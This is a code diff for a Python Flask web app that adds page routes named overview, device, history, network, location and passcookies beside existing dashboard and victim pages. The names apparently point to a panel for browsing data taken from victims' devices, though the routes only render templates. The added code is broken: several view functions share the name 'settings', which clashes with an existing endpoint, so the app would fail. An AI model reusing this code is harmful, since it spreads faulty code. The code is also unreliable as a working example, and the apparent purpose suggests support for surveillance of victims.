@@ -49,13 +49,33 @@ def dashboard():
 def victim():
     return render_template('victim.html')
 
-@app.route('/device')
-def device():
-    return render_template('device.html')
-
 @app.route('/settings')
 def settings():
     return render_template('settings.html')
+
+@app.route('/overview')
+def device():
+    return render_template('overview.html')
+
+@app.route('/device')
+def settings():
+    return render_template('device.html')
+
+@app.route('/history')
+def settings():
+    return render_template('history.html')
+
+@app.route('/network')
+def settings():
+    return render_template('network.html')
+
+@app.route('/location')
+def settings():
+    return render_template('location.html')
+
+@app.route('/passcookies')
+def settings():
+    return render_template('passcookies.html')
 
 @app.route('/static/<path:filename>')
 def serve_static(filename):
